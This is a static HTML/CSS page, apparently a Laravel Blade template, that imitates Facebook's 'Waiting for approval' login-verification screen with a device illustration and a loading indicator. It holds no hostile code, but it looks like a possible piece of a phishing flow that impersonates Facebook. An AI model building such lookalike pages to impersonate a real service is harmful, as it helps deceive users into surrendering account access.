<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Notification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #fce7f3 0%, #f0f9ff 50%, #f0fdf4 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
        }

        .container-main {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 20px;
            margin-bottom: 20px;
        }

        .btn-back {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #111827;
            padding: 0;
        }

        .btn-help {
            width: 32px;
            height: 32px;
            border: 2px solid #111827;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            background: none;
            font-weight: 600;
            font-size: 14px;
            color: #111827;
        }
          .fb-logo {
            color: #1877f2;
            font-size: 52px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 32px;
            letter-spacing: -2px;
        }

        /* Facebook Logo Section */
        .logo-section {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 24px;
        }

        .facebook-bar {
            width: 100px;
            height: 14px;
            background-color: #fb923c;
            border-radius: 20px;
        }

        .facebook-text {
            font-weight: 600;
            font-size: 14px;
            color: #111827;
        }

        /* Main Heading */
        h1 {
            font-size: 32px;
            font-weight: 700;
            color: #111827;
            margin-bottom: 24px;
            line-height: 1.2;
        }

        /* Description */
        .description {
            font-size: 16px;
            color: #374151;
            margin-bottom: 32px;
            line-height: 1.6;
        }

        .redacted-email {
            display: inline-block;
            width: 140px;
            height: 18px;
            background-color: #fb923c;
            border-radius: 12px;
            margin: 0 4px;
        }

        /* Illustration Section */
        .illustration-container {
            background: linear-gradient(135deg, #7dd3c0 0%, #2d9b8e 100%);
            border-radius: 24px;
            padding: 40px;
            margin-bottom: 32px;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 300px;
        }

        .devices-wrapper {
            position: relative;
            width: 100%;
            height: 260px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        /* Phone */
        .phone {
            position: absolute;
            left: 20px;
            width: 120px;
            height: 220px;
            background: white;
            border-radius: 24px;
            border: 6px solid #1f2937;
            box-shadow: 0 20px 25px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 2;
        }

        .phone-icon {
            width: 60px;
            height: 60px;
            background-color: #fb923c;
            border-radius: 50%;
            margin-bottom: 16px;
        }

        .phone-dots {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .phone-dot {
            width: 16px;
            height: 2px;
            background-color: #14b8a6;
            border-radius: 1px;
        }

        .phone-button {
            width: 60px;
            height: 16px;
            background-color: #14b8a6;
            border-radius: 8px;
            margin-top: 12px;
        }

        /* Shield */
        .shield-wrapper {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 3;
        }

        .shield-dots-top {
            width: 140px;
            border-top: 2px dashed rgba(0, 0, 0, 0.3);
            margin-bottom: 16px;
        }

        .shield {
            width: 60px;
            height: 70px;
            background-color: #eab308;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            font-size: 36px;
        }

        .shield-dots-bottom {
            width: 140px;
            border-top: 2px dashed rgba(0, 0, 0, 0.3);
            margin-top: 16px;
        }

        /* Laptop */
        .laptop {
            position: absolute;
            right: 20px;
            z-index: 2;
        }

        .laptop-screen {
            width: 140px;
            height: 100px;
            background-color: #374151;
            border-radius: 8px;
            box-shadow: 0 20px 25px rgba(0, 0, 0, 0.2);
            padding: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .laptop-content {
            width: 100%;
            height: 100%;
            background-color: #4b5563;
            border-radius: 6px;
            padding: 8px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            gap: 4px;
        }

        .laptop-line {
            height: 2px;
            background-color: #6b7280;
            border-radius: 1px;
        }

        .laptop-line:nth-child(1) {
            width: 100%;
        }

        .laptop-line:nth-child(2) {
            width: 80%;
        }

        .laptop-line:nth-child(3) {
            width: 60%;
        }

        .laptop-icons {
            display: flex;
            gap: 6px;
            margin-top: 6px;
        }

        .laptop-icon {
            width: 20px;
            height: 4px;
            border-radius: 2px;
            background-color: #eab308;
        }

        .laptop-icon:last-child {
            background-color: #6b7280;
        }

        .laptop-bottom {
            position: absolute;
            bottom: -6px;
            left: 50%;
            transform: translateX(-50%);
            width: 120px;
            height: 4px;
            background-color: #374151;
            border-radius: 0 0 20px 20px;
        }

        /* Waiting for Approval */
        .waiting-section {
            display: flex;
            gap: 16px;
            align-items: flex-start;
        }

        .loading-circle {
            width: 48px;
            height: 48px;
            border: 2px solid #111827;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            flex-grow: 0;
        }

        .loading-dots {
            display: flex;
            gap: 4px;
        }

        .dot {
            width: 4px;
            height: 4px;
            background-color: #111827;
            border-radius: 50%;
            animation: pulse 1.4s infinite;
        }

        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 0.6;
            }
            50% {
                opacity: 1;
            }
        }

        .waiting-text h2 {
            font-size: 18px;
            font-weight: 700;
            color: #111827;
            margin-bottom: 4px;
        }

        .waiting-text p {
            font-size: 14px;
            color: #6b7280;
            margin: 0;
        }

        /* Responsive */
        @media (max-width: 640px) {
            .container-main {
                padding: 16px;
            }

            h1 {
                font-size: 24px;
            }

            .illustration-container {
                padding: 24px;
                min-height: 240px;
            }

            .devices-wrapper {
                height: 180px;
            }

            .phone {
                width: 100px;
                height: 180px;
                left: 10px;
            }

            .laptop {
                right: 10px;
            }

            .shield-dots-top,
            .shield-dots-bottom {
                width: 80px;
            }
        }
    </style>
</head>
<body>
    <div class="container-main">
        <!-- Header -->
        <div class="header">
            <button class="btn-back">←</button>
            <button class="btn-help">?</button>
        </div>

        <!-- Facebook Logo -->
        <div class="logo-section">
            {{-- <div class="facebook-bar"></div> --}}
             {{-- <div class="fb-logo">facebook</div> --}}
            <span class="facebook-text">• Facebook</span>
        </div>

        <!-- Main Heading -->
        <h1>Check your notifications on another device</h1>

        <!-- Description -->
        <p class="description">
            We sent a notification to your email. Check your Facebook notifications there and approve the login to continue.
        </p>

        <!-- Illustration -->
        <div class="illustration-container">
            <div class="devices-wrapper">
                <!-- Phone -->
                <div class="phone">
                    <div class="phone-icon"></div>
                    <div class="phone-dots">
                        <div class="phone-dot"></div>
                        <div class="phone-dot"></div>
                    </div>
                    <div class="phone-button"></div>
                </div>

                <!-- Shield with Dotted Lines -->
                <div class="shield-wrapper">
                    <div class="shield-dots-top"></div>
                    <div class="shield">🔒</div>
                    <div class="shield-dots-bottom"></div>
                </div>

                <!-- Laptop -->
                <div class="laptop">
                    <div class="laptop-screen">
                        <div class="laptop-content">
                            <div class="laptop-line"></div>
                            <div class="laptop-line"></div>
                            <div class="laptop-line"></div>
                            <div class="laptop-icons">
                                <div class="laptop-icon"></div>
                                <div class="laptop-icon"></div>
                            </div>
                        </div>
                    </div>
                    <div class="laptop-bottom"></div>
                </div>
            </div>
        </div>

        <!-- Waiting for Approval -->
        <div class="waiting-section">
            <div class="loading-circle">
                <div class="loading-dots">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
            </div>
            <div class="waiting-text">
                <h2>Waiting for approval</h2>
                <p>Approve from the other device to continue.</p>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
